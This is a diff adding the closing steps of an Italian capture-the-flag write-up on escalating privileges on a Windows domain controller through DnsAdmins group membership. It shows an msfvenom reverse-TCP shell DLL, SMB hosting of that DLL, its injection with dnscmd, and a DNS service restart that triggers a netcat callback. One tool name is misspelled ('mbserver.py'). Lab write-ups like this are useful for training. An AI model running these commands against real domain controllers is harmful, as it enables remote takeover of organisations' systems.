@@ -115,4 +115,33 @@ MEGABANK\DnsAdmins   Alias S-1-5-21-[...]-3596683436-1101 Mandatory group, Enabl
 
 Quindi noto che appartiene al gruppo DnsAdmins, vulnerabile (di cui esiste anche un exploit in Msf).
 
-    
+Innanzitutto genero una dll infetta con payload una reverse_tcp_shell:
+
+```
+msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f dll > privesc.dll
+```
+Quindi lo metto in hosting tramite samba:
+
+```
+mbserver.py share ./
+
+```
+
+A questo punto dalla macchina windows inietto la DLL:
+
+```
+dnscmd DC /config /serverlevelplugindll \\<HOST>\share\privesc.dll
+```
+Quindi verifico con:
+```
+
+Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
+```
+
+Metto in ascolto NetCat, infine lancio i seguenti comandi per riavviare la configurazione dns sulla macchina vittima:
+
+```
+sc.exe <X> stop dns
+sc.exe <X> start dns
+```
+That's it! Root's Flag :) 
